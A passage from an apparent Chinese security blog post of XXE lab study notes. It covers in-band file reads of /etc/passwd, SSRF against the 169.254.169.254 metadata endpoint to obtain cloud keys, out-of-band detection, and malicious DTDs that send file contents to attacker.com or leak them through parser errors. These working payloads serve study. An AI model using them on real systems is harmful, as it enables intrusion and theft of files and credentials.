<p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x670D;&#x52A1;&#x5668;&#x4F9D;&#x636E;&#x63D0;&#x4EA4;&#x7684; XML &#x68C0;&#x67E5;&#x4E86;&#x5E93;&#x5B58;&#x6570;&#xFF0C;&#x5E76;&#x5728;&#x8FD4;&#x56DE;&#x5305;&#x4E2D;&#x56DE;&#x663E;&#x6570;&#x636E;&#x3002;&#x5B9E;&#x9A8C;&#x73AF;&#x5883;&#x672A;&#x5BF9; XXE &#x653B;&#x51FB;&#x505A;&#x7279;&#x6B8A;&#x7684;&#x9632;&#x5FA1;&#x63AA;&#x65BD;&#xFF0C;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x6784;&#x9020;&#x4EE5;&#x4E0B; Payload &#x68C0;&#x7D22; <code>/etc/passwd</code> &#x6587;&#x4EF6;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;</span><br><span class="line">&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;/stockCheck&gt;</span><br></pre></td></tr></table></figure>

<p>Payload &#x5728; DTD &#x4E2D;&#x5B9A;&#x4E49;&#x4E86;&#x5916;&#x90E8;&#x5B9E;&#x4F53; xxe&#xFF0C;&#x5176;&#x503C;&#x4E3A; <code>/etc/passwd</code> &#x6587;&#x4EF6;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x5E76;&#x5728; <code>productId</code> &#x4E2D;&#x5F15;&#x7528;&#x8BE5;&#x5B9E;&#x4F53;</p>
<p><img src="/2019/11/12/XXE-&#x5B66;&#x4E60;&#x7B14;&#x8BB0;/3.png" alt="image-20191113101412761"></p>
<p>&#x5728;&#x771F;&#x5B9E;&#x73AF;&#x5883;&#x4E2D;&#xFF0C;&#x63D0;&#x4EA4;&#x7684; XML &#x4E2D;&#x901A;&#x5E38;&#x4F1A;&#x5B58;&#x5728;&#x5927;&#x91CF;&#x8282;&#x70B9;&#xFF0C;&#x5176;&#x4E2D;&#x4EFB;&#x4F55;&#x4E00;&#x4E2A;&#x90FD;&#x53EF;&#x80FD;&#x5728;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x7684;&#x54CD;&#x5E94;&#x4E2D;&#x4F7F;&#x7528;&#x3002;&#x4E3A;&#x4E86;&#x7CFB;&#x7EDF;&#x5730;&#x6D4B;&#x8BD5; XXE &#x6F0F;&#x6D1E;&#x901A;&#x5E38;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x9884;&#x5B9A;&#x4E49;&#x7684;&#x5B9E;&#x4F53;&#x6765;&#x5206;&#x522B;&#x6D4B;&#x8BD5; XML &#x4E2D;&#x7684;&#x6BCF;&#x4E2A;&#x6570;&#x636E;&#x8282;&#x70B9;&#xFF0C;&#x5E76;&#x67E5;&#x770B;&#x5176;&#x662F;&#x5426;&#x51FA;&#x73B0;&#x5728;&#x54CD;&#x5E94;&#x4E2D;</p>
<h2 id="&#x5229;&#x7528;-XXE-&#x6267;&#x884C;-SSRF-&#x653B;&#x51FB;"><a href="#&#x5229;&#x7528;-XXE-&#x6267;&#x884C;-SSRF-&#x653B;&#x51FB;" class="headerlink" title="&#x5229;&#x7528; XXE &#x6267;&#x884C; SSRF &#x653B;&#x51FB;"></a>&#x5229;&#x7528; XXE &#x6267;&#x884C; SSRF &#x653B;&#x51FB;</h2><p>&#x9664;&#x4E86;&#x68C0;&#x7D22;&#x654F;&#x611F;&#x6570;&#x636E;&#x5916;&#xFF0C;XXE&#x653B;&#x51FB;&#x7684;&#x53E6;&#x4E00;&#x4E2A;&#x4E3B;&#x8981;&#x5F71;&#x54CD;&#x662F;&#x53EF;&#x7528;&#x4E8E;&#x6267;&#x884C;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x8BF7;&#x6C42;&#x4F2A;&#x9020;&#xFF08;SSRF&#xFF09;&#x3002; &#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x6F5C;&#x5728;&#x7684;&#x4E25;&#x91CD;&#x6F0F;&#x6D1E;&#xFF0C;&#x53EF;&#x80FD;&#x5BFC;&#x81F4;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x5411;&#x670D;&#x52A1;&#x5668;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE;&#x7684;&#x4EFB;&#x4F55; URL &#x53D1;&#x51FA; HTTP &#x8BF7;&#x6C42; </p>
<p>&#x5728;&#x5B9E;&#x9A8C;&#x73AF;&#x5883;&#x4E2D;&#xFF1A;<code>http://169.254.169.254/</code> &#x4E0A;&#x8FD0;&#x884C;&#x7740;&#x6A21;&#x62DF;&#x7684; EC2 &#x5143;&#x6570;&#x636E;&#x7AEF;&#x70B9;&#xFF0C;&#x7528;&#x4E8E;&#x68C0;&#x7D22;&#x6709;&#x5173;&#x5B9E;&#x4F8B;&#x7684;&#x6570;&#x636E;</p>
<p>&#x6784;&#x9020; Payload&#xFF0C;&#x5E76;&#x5728; <code>&lt;productId&gt;</code> &#x4E2D;&#x5F15;&#x7528; xxe &#x5B9E;&#x4F53;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;http://169.254.169.254/&quot;&gt; ]&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/12/XXE-&#x5B66;&#x4E60;&#x7B14;&#x8BB0;/12.png" alt="image-20191114084241856"></p>
<p>&#x54CD;&#x5E94;&#x4E2D;&#x5C06;&#x5305;&#x542B;&#x6765;&#x81EA;&#x5143;&#x6570;&#x636E;&#x7AEF;&#x70B9;&#x7684;&#x54CD;&#x5E94;&#xFF1A;&#x201C;Invalid product ID: xxx&#x201D;&#xFF0C;&#x8BE5;&#x54CD;&#x5E94;&#x6700;&#x521D;&#x5C06;&#x8FD4;&#x56DE;&#x4E0B;&#x7EA7;&#x6587;&#x4EF6;&#x5939;&#x540D;&#x79F0;&#x3002;&#x8FED;&#x4EE3;&#x6DFB;&#x52A0; DTD &#x4E2D;&#x7684; URL &#x6700;&#x7EC8;&#x53EF;&#x4EE5;&#x8BF7;&#x6C42;&#x5230;&#x5143;&#x6570;&#x636E;&#x7AEF;&#x70B9;&#x3002;&#x5B83;&#x5C06;&#x8FD4;&#x56DE;&#x5305;&#x542B; SecretAccessKey &#x7684; Json &#x4FE1;&#x606F;</p>
<p><img src="/2019/11/12/XXE-&#x5B66;&#x4E60;&#x7B14;&#x8BB0;/13.png" alt="image-20191114084948454"></p>
<h1 id="Blind-XXE"><a href="#Blind-XXE" class="headerlink" title="Blind XXE"></a>Blind XXE</h1><p>&#x5982;&#x679C;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x5BB9;&#x6613;&#x53D7;&#x5230; XXE &#x6CE8;&#x5165;&#x7684;&#x653B;&#x51FB;&#xFF0C;&#x4F46;&#x4E0D;&#x4F1A;&#x5728;&#x54CD;&#x5E94;&#x4E2D;&#x8FD4;&#x56DE;&#x4EFB;&#x4F55;&#x5DF2;&#x5B9A;&#x4E49;&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#x7684;&#x503C;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5229;&#x7528; Blind XXE&#x3002;&#x7531;&#x4E8E;&#x65E0;&#x56DE;&#x663E;&#xFF0C;&#x56E0;&#x6B64;&#x9700;&#x8981;&#x5F15;&#x5165;&#x65B0;&#x7684;&#x6280;&#x672F;</p>
<ul>
<li>&#x5229;&#x7528;&#x5E26;&#x5916;&#x6280;&#x672F;&#xFF0C;&#x4ECE;&#x4EA4;&#x4E92;&#x6570;&#x636E;&#x4E2D;&#x83B7;&#x53D6;&#x6CC4;&#x9732;&#x7684;&#x654F;&#x611F;&#x6570;&#x636E;</li>
<li>&#x89E6;&#x53D1; XML &#x89E3;&#x6790;&#x9519;&#x8BEF;&#xFF0C;&#x4ECE;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#x4E2D;&#x83B7;&#x53D6;&#x654F;&#x611F;&#x6570;&#x636E;</li>
</ul>
<h2 id="&#x5229;&#x7528;&#x5E26;&#x5916;&#xFF08;OAST&#xFF09;&#x6280;&#x672F;&#x68C0;&#x6D4B;-Blind-XXE"><a href="#&#x5229;&#x7528;&#x5E26;&#x5916;&#xFF08;OAST&#xFF09;&#x6280;&#x672F;&#x68C0;&#x6D4B;-Blind-XXE" class="headerlink" title="&#x5229;&#x7528;&#x5E26;&#x5916;&#xFF08;OAST&#xFF09;&#x6280;&#x672F;&#x68C0;&#x6D4B; Blind XXE"></a>&#x5229;&#x7528;&#x5E26;&#x5916;&#xFF08;OAST&#xFF09;&#x6280;&#x672F;&#x68C0;&#x6D4B; Blind XXE</h2><p>&#x5C31;&#x4E2A;&#x4EBA;&#x7406;&#x89E3;&#xFF0C;&#x540C;&#x4E0A;&#x8FF0; SSRF XXE &#x76F8;&#x4F3C;&#x3002;&#x4E0D;&#x540C;&#x70B9;&#x5728;&#x4E8E;&#xFF0C;&#x5176;&#x63A7;&#x5236;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x540E;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x53D1;&#x9001;&#x7684; URL &#x8BF7;&#x6C42;&#x6307;&#x5411;&#x653B;&#x51FB;&#x8005;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4EE5;&#x4F7F;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x4EE5;&#x76D1;&#x89C6;&#x6700;&#x7EC8;&#x7684; DNS &#x548C; HTTP &#x8BF7;&#x6C42;&#xFF0C;&#x5224;&#x65AD;&#x662F;&#x5426;&#x5B58;&#x5728; Blind XXE</p>
<p>Payload&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;http://attacker.com&quot;&gt; ]&gt;</span><br><span class="line">&lt;stockCheck&gt;</span><br><span class="line">&lt;productId&gt;&amp;xxe;&lt;/productId&gt;</span><br><span class="line">&lt;storeId&gt;2&lt;/storeId&gt;</span><br><span class="line">&lt;/stockCheck&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/12/XXE-&#x5B66;&#x4E60;&#x7B14;&#x8BB0;/4.png" alt="image-20191113112600146"></p>
<h2 id="&#x5229;&#x7528;&#x53C2;&#x6570;&#x5B9E;&#x4F53;&#x68C0;&#x6D4B;-Blind-XXE"><a href="#&#x5229;&#x7528;&#x53C2;&#x6570;&#x5B9E;&#x4F53;&#x68C0;&#x6D4B;-Blind-XXE" class="headerlink" title="&#x5229;&#x7528;&#x53C2;&#x6570;&#x5B9E;&#x4F53;&#x68C0;&#x6D4B; Blind XXE"></a>&#x5229;&#x7528;&#x53C2;&#x6570;&#x5B9E;&#x4F53;&#x68C0;&#x6D4B; Blind XXE</h2><p>&#x6709;&#x65F6;&#xFF0C;&#x7531;&#x4E8E;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x8FDB;&#x884C;&#x4E86;&#x67D0;&#x4E9B;&#x8F93;&#x5165;&#x9A8C;&#x8BC1;&#x6216;&#x6B63;&#x5728;&#x4F7F;&#x7528; XML &#x89E3;&#x6790;&#x5668;&#x7684;&#x67D0;&#x4E9B;&#x589E;&#x5F3A;&#x529F;&#x80FD;&#xFF0C;&#x4F7F;&#x5E38;&#x89C4;&#x5B9E;&#x4F53;&#x7684; XXE &#x653B;&#x51FB;&#x88AB;&#x963B;&#x6B62;&#x4E86;&#x3002;&#x5728;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#x53EF;&#x4EE5;&#x6539;&#x4E3A;&#x4F7F;&#x7528; XML &#x53C2;&#x6570;&#x5B9E;&#x4F53;&#xFF08;&#x53C2;&#x6570;&#x5B9E;&#x4F53;&#x5728; DTD &#x5185;&#x5F15;&#x7528;&#xFF09;</p>
<p>XML &#x53C2;&#x6570;&#x5B9E;&#x4F53;&#x662F;&#x4E00;&#x79CD;&#x7279;&#x6B8A;&#x7684; XML &#x5B9E;&#x4F53;&#xFF0C;&#x53EA;&#x80FD;&#x5728; DTD &#x5185;&#x5F15;&#x7528;&#x3002;&#x5C31;&#x76EE;&#x524D;&#x800C;&#x8A00;&#xFF0C;&#x53EA;&#x9700;&#x5173;&#x6CE8;&#x4E24;&#x70B9;&#xFF1A;</p>
<ol>
<li>XML &#x53C2;&#x6570;&#x5B9E;&#x4F53;&#x58F0;&#x660E;&#xFF1A;<code>&lt;!ENTITY % myparameterentity &quot;my parameter entity value&quot; &gt;</code></li>
<li>XML &#x53C2;&#x6570;&#x5B9E;&#x4F53;&#x5F15;&#x7528;&#xFF1A;<code>%myparameterentity;</code></li>
</ol>
<p>&#x8FD9;&#x610F;&#x5473;&#x7740;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; XML &#x53C2;&#x6570;&#x5B9E;&#x4F53;&#x4F7F;&#x7528;&#x5E26;&#x5916;&#x68C0;&#x6D4B;&#x6765;&#x6D4B;&#x8BD5; Blind XXE&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM &quot;http://attacker.com&quot;&gt; %xxe; ]&gt;</span><br></pre></td></tr></table></figure>

<p>Payload &#x58F0;&#x660E;&#x4E86;&#x4E00;&#x4E2A;&#x79F0;&#x4E3A; xxe &#x7684; XML &#x53C2;&#x6570;&#x5B9E;&#x4F53;&#xFF0C;&#x7136;&#x540E;&#x5728; DTD &#x4E2D;&#x5F15;&#x7528;&#x8BE5;&#x5B9E;&#x4F53;&#x3002;&#x89E3;&#x6790;&#x6210;&#x529F;&#x5C06;&#x5BFC;&#x81F4;&#x5BF9;&#x653B;&#x51FB;&#x8005;&#x57DF;&#x7684; DNS &#x67E5;&#x627E;&#x548C; HTTP &#x8BF7;&#x6C42;&#xFF0C;&#x4F9D;&#x6B64;&#x5224;&#x65AD;&#x653B;&#x51FB;&#x662F;&#x5426;&#x6210;&#x529F;</p>
<p><img src="/2019/11/12/XXE-&#x5B66;&#x4E60;&#x7B14;&#x8BB0;/5.png" alt="image-20191113114733863"></p>
<h2 id="&#x5916;&#x5E26;&#x6570;&#x636E;"><a href="#&#x5916;&#x5E26;&#x6570;&#x636E;" class="headerlink" title="&#x5916;&#x5E26;&#x6570;&#x636E;"></a>&#x5916;&#x5E26;&#x6570;&#x636E;</h2><p>&#x68C0;&#x6D4B;&#x5230;&#x6F0F;&#x6D1E;&#xFF0C;&#x53C8;&#x8BE5;&#x5982;&#x4F55;&#x5229;&#x7528; Blind XXE &#x83B7;&#x53D6;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x654F;&#x611F;&#x4FE1;&#x606F;&#xFF1F;</p>
<p>&#x9996;&#x5148;&#x9700;&#x8981;&#x653B;&#x51FB;&#x8005;&#x5728;&#x516C;&#x7F51;&#x4E0A;&#x6258;&#x7BA1;&#x4E00;&#x4EFD;&#x6076;&#x610F; DTD&#xFF08;<strong>Malicious DTD</strong>&#xFF09;&#xFF0C;&#x7136;&#x540E;&#x5728; Blind XXE Payload &#x4E2D;&#x8C03;&#x7528;&#x5916;&#x90E8; Malicious DTD&#x3002;&#x81F3;&#x4E8E;&#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x5F15;&#x5165;&#x5916;&#x90E8; Malicious DTD&#xFF0C;&#x8BE6;&#x89C1;&#xFF1A;<a href="https://www.freebuf.com/vuls/207639.html" target="_blank" rel="noopener">Blind XXE &#x8BE6;&#x89E3;&#x4E0E; Google CTF &#x4E00;&#x9053;&#x9898;&#x5206;&#x6790;</a></p>
<p>&#x4E00;&#x4EFD;&#x8BFB;&#x53D6; <code>/etc/hostname</code> &#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x7684; Malicious DTD &#x5982;&#x4E0B;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/hostname&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &apos;http://attacker.com/?x=%file;&apos;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate;</span><br></pre></td></tr></table></figure>

<p>&#x8BE5; DTD &#x6267;&#x884C;&#x4EE5;&#x4E0B;&#x6B65;&#x9AA4;&#xFF1A;</p>
<ul>
<li>&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x540D;&#x4E3A; file &#x7684; XML &#x53C2;&#x6570;&#x5B9E;&#x4F53;&#xFF0C;&#x5176;&#x5305;&#x542B; <code>/etc/hostname</code> &#x6587;&#x4EF6;&#x7684;&#x5185;&#x5BB9;</li>
<li>&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x540D;&#x4E3A; eval &#x7684; XML &#x53C2;&#x6570;&#x5B9E;&#x4F53;&#xFF0C;&#x5176;&#x5305;&#x542B;&#x53E6;&#x4E00;&#x4E2A;&#x540D;&#x4E3A; exfiltrate &#x7684; XML &#x53C2;&#x6570;&#x5B9E;&#x4F53;&#x7684;&#x52A8;&#x6001;&#x58F0;&#x660E;&#xFF08;<code>&amp;#x25</code> &#x4E3A; <code>%</code> &#x7684;&#x5B9E;&#x4F53;&#x5F15;&#x7528;&#xFF09;&#x3002;&#x5C06;&#x901A;&#x8FC7;&#x5411;&#x653B;&#x51FB;&#x8005; Web &#x670D;&#x52A1;&#x5668;&#x53D1;&#x51FA; HTTP &#x8BF7;&#x6C42;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x5916;&#x5E26;&#x6570;&#x636E;&#xFF08;URL &#x4E2D;&#x5C06;&#x5305;&#x542B; <code>%file;</code> &#x7684;&#x503C;&#xFF09;</li>
<li>&#x4F7F;&#x7528; eval &#x5B9E;&#x4F53;&#x5BF9; <code>exfiltrate</code> &#x5B9E;&#x4F53;&#x8FDB;&#x884C;&#x52A8;&#x6001;&#x58F0;&#x660E;</li>
<li>&#x4F7F;&#x7528; <code>%exfiltrate;</code> &#x8BF7;&#x6C42;&#x6307;&#x5B9A;&#x7684; URL</li>
</ul>
<p>&#x4F8B;&#x5982;&#xFF0C;&#x5728;&#x4EE5;&#x4E0B; URL &#x4E0A;&#x63D0;&#x4F9B; Malicious DTD</p>
<p><code>http://web-attacker.com/malicious.dtd</code></p>
<p>&#x7136;&#x540E;&#x5411;&#x5B58;&#x5728;&#x6F0F;&#x6D1E;&#x7684;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x63D0;&#x4EA4;&#x4EE5;&#x4E0B; Payload&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;http://web-attacker.com/malicious.dtd&quot;&gt; %xxe;]&gt;</span><br></pre></td></tr></table></figure>

<p>&#x8BE5; Payload &#x58F0;&#x660E;&#x4E00;&#x4E2A;&#x540D;&#x4E3A; xxe &#x7684; XML &#x53C2;&#x6570;&#x5B9E;&#x4F53;&#xFF0C;&#x7136;&#x540E;&#x5728; DTD &#x4E2D;&#x5F15;&#x7528;&#x8BE5;&#x5B9E;&#x4F53;&#x3002;&#x8FD9;&#x5C06;&#x5BFC;&#x81F4; XML &#x89E3;&#x6790;&#x5668;&#x83B7;&#x53D6;&#x5916;&#x90E8; Malicious DTD &#x5E76;&#x5185;&#x8054;&#x89E3;&#x91CA;&#xFF0C;&#x7136;&#x540E;&#x6267;&#x884C; Malicious DTD &#x4E2D;&#x5B9A;&#x4E49;&#x7684;&#x6B65;&#x9AA4;&#xFF0C;&#x5C06; <code>/etc/hostname</code> &#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x4F20;&#x8F93;&#x5230;&#x653B;&#x51FB;&#x8005;&#x7684;&#x670D;&#x52A1;&#x5668;</p>
<p><img src="/2019/11/12/XXE-&#x5B66;&#x4E60;&#x7B14;&#x8BB0;/14.png" alt="image-20191114092909670"></p>
<p><strong>&#x6CE8;&#x610F;&#xFF1A;</strong>&#x8FD9;&#x79CD;&#x65B9;&#x6CD5;&#x53EF;&#x80FD;&#x4E0D;&#x9002;&#x7528;&#x4E8E; <code>/etc/passwd</code> &#x8FD9;&#x79CD;&#x5305;&#x542B;&#x6362;&#x884C;&#x7B26;&#x7684;&#x6587;&#x4EF6;&#x3002;&#x56E0;&#x4E3A;&#x67D0;&#x4E9B; XML &#x89E3;&#x6790;&#x5668;&#x4F7F;&#x7528; API &#x6765;&#x83B7;&#x53D6;&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#x4E2D;&#x5B9A;&#x4E49;&#x7684; URL&#xFF0C;&#x8BE5; API &#x4F1A;&#x9A8C;&#x8BC1; URL &#x4E2D;&#x5141;&#x8BB8;&#x4F7F;&#x7528;&#x7684;&#x5B57;&#x7B26;&#x3002;&#x5728;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x53EF;&#x80FD;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; FTP &#x534F;&#x8BAE;&#x3002;&#x5982;&#x679C;&#x652F;&#x6301; <code>php://filter/read=convert.base64-encode/resource=xxx</code> &#x534F;&#x8BAE;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5C06;&#x5176;&#x7F16;&#x7801;&#x4EE5;&#x7ED5;&#x8FC7;&#x68C0;&#x6D4B;</p>
<h2 id="&#x901A;&#x8FC7;&#x9519;&#x8BEF;&#x6D88;&#x606F;&#x68C0;&#x7D22;&#x6570;&#x636E;"><a href="#&#x901A;&#x8FC7;&#x9519;&#x8BEF;&#x6D88;&#x606F;&#x68C0;&#x7D22;&#x6570;&#x636E;" class="headerlink" title="&#x901A;&#x8FC7;&#x9519;&#x8BEF;&#x6D88;&#x606F;&#x68C0;&#x7D22;&#x6570;&#x636E;"></a>&#x901A;&#x8FC7;&#x9519;&#x8BEF;&#x6D88;&#x606F;&#x68C0;&#x7D22;&#x6570;&#x636E;</h2><p>&#x5982;&#x679C;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x5728;&#x5176;&#x54CD;&#x5E94;&#x5185;&#x8FD4;&#x56DE;&#x751F;&#x6210;&#x7684;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#xFF0C;&#x5219;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x89E6;&#x53D1; XML &#x89E3;&#x6790;&#x9519;&#x8BEF;&#xFF0C;&#x4F7F;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#x4E2D;&#x5305;&#x542B;&#x5E0C;&#x671B;&#x68C0;&#x7D22;&#x7684;&#x654F;&#x611F;&#x6570;&#x636E;&#xFF0C;&#x6765;&#x5916;&#x5E26;&#x4FE1;&#x606F;</p>
<p>&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x4EE5;&#x4E0B; Malicious DTD &#x89E6;&#x53D1;&#x5305;&#x542B; <code>/etc/passwd</code> &#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x7684; XML &#x89E3;&#x6790;&#x9519;&#x8BEF;&#x6D88;&#x606F;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &apos;file:///nonexistent/%file;&apos;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%error;</span><br></pre></td></tr></table></figure>

<p>&#x8BE5; DTD &#x6267;&#x884C;&#x4EE5;&#x4E0B;&#x6B65;&#x9AA4;&#xFF1A;</p>
<ul>
<li>&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x540D;&#x4E3A; file &#x7684; XML &#x53C2;&#x6570;&#x5B9E;&#x4F53;&#xFF0C;&#x5176;&#x4E2D;&#x5305;&#x542B; <code>/etc/passwd</code> &#x6587;&#x4EF6;&#x7684;&#x5185;&#x5BB9;</li>
<li>&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x540D;&#x4E3A; eval &#x7684; XML &#x53C2;&#x6570;&#x5B9E;&#x4F53;&#xFF0C;&#x5176;&#x4E2D;&#x5305;&#x542B;&#x53E6;&#x4E00;&#x4E2A;&#x540D;&#x79F0;&#x4E3A; error &#x7684; XML &#x53C2;&#x6570;&#x5B9E;&#x4F53;&#x7684;&#x52A8;&#x6001;&#x58F0;&#x660E;&#x3002;error &#x5B9E;&#x4F53;&#x5C06;&#x901A;&#x8FC7;&#x52A0;&#x8F7D;&#x4E00;&#x4E2A;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x6587;&#x4EF6;&#xFF1A;<code>/nonexistent/%file;</code> &#x5F15;&#x53D1;&#x9519;&#x8BEF;</li>
<li>&#x4F7F;&#x7528; <code>%eval;</code> &#x6267;&#x884C; eval &#x5B9E;&#x4F53;&#x7684;&#x52A8;&#x6001;&#x58F0;&#x660E;</li>
<li>&#x4F7F;&#x7528; <code>%error;</code> &#x52A0;&#x8F7D;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x6587;&#x4EF6;&#x5F15;&#x53D1;&#x9519;&#x8BEF;&#xFF0C;&#x9519;&#x8BEF;&#x63D0;&#x793A;&#x4E2D;&#x5C06;&#x5305;&#x542B; <code>/etc/passwd</code> &#x7684;&#x6587;&#x4EF6;&#x5185;&#x5BB9;</li>
</ul>
<p>&#x7531;&#x6B64;&#xFF0C;&#x6784;&#x9020; Malicious DTD&#xFF1A;</p>
<p><img src="/2019/11/12/XXE-&#x5B66;&#x4E60;&#x7B14;&#x8BB0;/8.png" alt="image-20191113160837726"></p>
<p><img src="/2019/11/12/XXE-&#x5B66;&#x4E60;&#x7B14;&#x8BB0;/9.png" alt="image-20191113161131242"></p>
<h2 id="&#x627E;&#x5230;&#x73B0;&#x6709;&#x7684;-DTD-&#x6587;&#x4EF6;&#x4EE5;&#x91CD;&#x65B0;&#x5229;&#x7528;"><a href="#&#x627E;&#x5230;&#x73B0;&#x6709;&#x7684;-DTD-&#x6587;&#x4EF6;&#x4EE5;&#x91CD;&#x65B0;&#x5229;&#x7528;" class="headerlink" title="&#x627E;&#x5230;&#x73B0;&#x6709;&#x7684; DTD &#x6587;&#x4EF6;&#x4EE5;&#x91CD;&#x65B0;&#x5229;&#x7528;"></a>&#x627E;&#x5230;&#x73B0;&#x6709;&#x7684; DTD &#x6587;&#x4EF6;&#x4EE5;&#x91CD;&#x65B0;&#x5229;&#x7528;</h2><p>&#x672C;&#x8282;&#x8BE6;&#x89C1;&#xFF1A;<a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/" target="_blank" rel="noopener">Exploiting XXE with local DTD files</a></p>
<p>&#x819C; <a href="https://twitter.com/phithon_xg/status/1073845338606194689" target="_blank" rel="noopener">P&#x725B;</a></p>
<p>&#x524D;&#x9762;&#x7684;&#x6280;&#x672F;&#x9002;&#x7528;&#x4E8E;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x5BF9;&#x5916;&#x90E8; DTD &#x90FD;&#x53EF;&#x4EE5;&#x5F88;&#x597D;&#x89E3;&#x6790;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x5F53;&#x5185;&#x90E8; DTD &#x5728; DOCTYPE &#x5143;&#x7D20;&#x4E2D;&#x88AB;&#x5B8C;&#x5168;&#x6307;&#x5B9A;&#x65F6;&#xFF08;&#x7981;&#x7528;&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#x65F6;&#xFF09;&#xFF0C;&#x4E0A;&#x8FF0;&#x65B9;&#x6CD5;&#x901A;&#x5E38;&#x65E0;&#x6CD5;&#x6B63;&#x5E38;&#x5DE5;&#x4F5C;&#x3002;&#x8FD9;&#x662F;&#x56E0;&#x4E3A;&#x4E0A;&#x8FF0;&#x65B9;&#x6CD5;&#x90FD;&#x6D89;&#x53CA;&#x5230;&#x5728; XML &#x53C2;&#x6570;&#x5B9E;&#x4F53;&#x7684;&#x5B9A;&#x4E49;&#x5185;&#x4F7F;&#x7528;&#x53E6;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x5B9E;&#x4F53;&#x3002;&#x6839;&#x636E; XML &#x89C4;&#x8303;&#xFF0C;&#x8FD9;&#x79CD;&#x7528;&#x6CD5;&#x5728;&#x5916;&#x90E8; DTD &#x4E2D;&#x662F;&#x5141;&#x8BB8;&#x7684;&#xFF0C;&#x4F46;&#x5728;&#x5185;&#x90E8; DTD 